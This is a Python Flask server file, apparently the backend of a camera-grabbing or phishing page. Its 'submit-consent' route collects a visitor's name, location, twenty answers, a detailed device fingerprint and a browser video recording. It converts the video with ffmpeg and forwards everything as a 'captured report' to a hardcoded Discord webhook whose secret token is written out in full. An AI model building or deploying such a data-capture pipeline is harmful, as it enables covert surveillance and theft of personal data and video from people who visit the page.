import os
import json
import subprocess
import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

DISCORD_WEBHOOK_URL = os.getenv(
    "DISCORD_WEBHOOK_URL",
    "https://discord.com/api/webhooks/1558192127085781025/wUzlyTNtQbjoWz6aTgsE_YAKXj14XYo-gs7C6f25QBfqr_LqWUZQBQ97bUKdZsJ69X-E"
)

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/submit-consent", methods=["POST"])
def submit_consent():
    username = request.form.get("username", "Utilisateur Anonyme")
    location = request.form.get("location", "Non disponible")
    
    device_str = request.form.get("device", "{}")
    try:
        device = json.loads(device_str)
    except Exception:
        device = {}

    # جمع الـ 20 سؤالاً تلقائياً
    questions_summary = []
    for i in range(1, 21):
        val = request.form.get(f"q{i}", "N/A")
        questions_summary.append(f"Q{i}: {val}")
    
    q_text = " | ".join(questions_summary[:5]) # عينة أو كلها حسب الرغبة

    video_file = request.files.get("video")

    appareil = device.get('appareil', 'Appareil Inconnu')
    systeme = device.get('systemeExploitation', 'Système Inconnu')
    navigateur = device.get('navigateur', 'Inconnu')
    langue = device.get('langueSysteme', 'Inconnue')
    ram = device.get('memoireRAMApproximative', 'Non disponible')
    cpu = device.get('processeurCœurs', 'Non disponible')
    resolution = device.get('resolutionEcran', 'Non disponible')
    batterie = device.get('niveauBatterie', 'Non disponible')
    charge = device.get('etatCharge', 'Non disponible')
    eco = device.get('modeEconomieEnergie', 'Non disponible')
    orientation = device.get('orientationEcran', 'Non disponible')
    tactile = device.get('pointsTactilesMax', 'Non disponible')
    architecture = device.get('architectureCPU', 'Non disponible')
    reseau = device.get('connexionReseau', 'Non disponible')
    time_zone = device.get('fuseauHoraire', 'Non disponible')

    content_text = f"""✅ **Nouveau Rapport Capturé (Capture/Formulaire):**
• **Nom / Statut:** {username}
• **Questions:** {q_text}
• **Appareil:** {appareil}
• **Système d'exploitation:** {systeme}
• **Navigateur:** {navigateur}
• **Langue du système:** {langue}
• **Niveau de Batterie:** {batterie} ({charge})
• **Économie d'énergie:** {eco}
• **Mémoire RAM:** {ram}
• **Processeur (CPU):** {cpu} ({architecture})
• **Résolution Écran:** {resolution} ({orientation})
• **Points Tactiles:** {tactile}
• **Réseau:** {reseau}
• **Fuseau Horaire:** {time_zone}"""

    payload = {
        "content": content_text
    }

    input_path = "temp_input.webm"
    output_path = "recording.mp4"

    try:
        files = {}
        if video_file:
            # حفظ الملف المؤقت القادم من المتصفح
            video_file.save(input_path)
            
            # محاولة تحويل الفيديو إلى MP4 باستخدام ffmpeg ليعمل مباشرة في ديسكورد
            try:
                subprocess.run([
                    "ffmpeg", "-y", "-i", input_path, 
                    "-c:v", "libx264", "-preset", "ultrafast", 
                    "-c:a", "aac", output_path
                ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                with open(output_path, "rb") as f:
                    files = {
                        "file": ("recording.mp4", f.read(), "video/mp4")
                    }
            except Exception:
                # في حال لم يكن ffmpeg مثبتاً، يتم إرسال الملف كما هو
                with open(input_path, "rb") as f:
                    files = {
                        "file": ("recording.webm", f.read(), "video/webm")
                    }

        resp = requests.post(
            DISCORD_WEBHOOK_URL, 
            data={"payload_json": json.dumps(payload)}, 
            files=files if files else None, 
            timeout=30
        )
        resp.raise_for_status()

        # تنظيف الملفات المؤقتة
        if os.path.exists(input_path): os.remove(input_path)
        if os.path.exists(output_path): os.remove(output_path)

        return jsonify({"message": "Success"}), 200
    except requests.RequestException as e:
        if os.path.exists(input_path): os.remove(input_path)
        if os.path.exists(output_path): os.remove(output_path)
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(port=5000, debug=True)
